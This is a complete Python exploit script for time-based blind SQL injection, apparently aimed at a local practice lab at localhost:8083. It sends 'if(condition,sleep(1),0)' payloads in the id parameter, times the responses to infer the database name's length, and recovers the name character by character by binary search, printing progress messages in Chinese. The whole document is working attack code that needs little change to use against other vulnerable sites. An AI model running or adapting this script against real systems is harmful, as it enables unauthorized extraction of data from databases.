import requests,time
URL = "http://localhost:8083/si6/?id="
SLEEP = 1
def ask(cond):
    payload = '1 and if(%s,sleep(%d),0)' % (cond, SLEEP)
    url = URL + payload
    t0 = time.time()
    try:
        requests.get(url, timeout=10)
    except Exception :
        pass
    return (time.time() - t0) > SLEEP * 0.6
for n in range(1, 10):
    if ask("length(database())=%d" % n):
        print("库名长度 =", n)
        break
name = ""
for pos in range(1,8):
    lo, hi = 32, 127
    while lo < hi:
        mid = (lo + hi) // 2
        cond = "ascii(substr(database(),%d,1))>%d" % (pos, mid)
        if ask(cond):
            lo = mid + 1
        else:
            hi = mid
    ch = chr(lo)
    if ch == " " or ch == "}":
            break
    name += ch
    print("猜库名：", name)

print("结论：库名 =", name)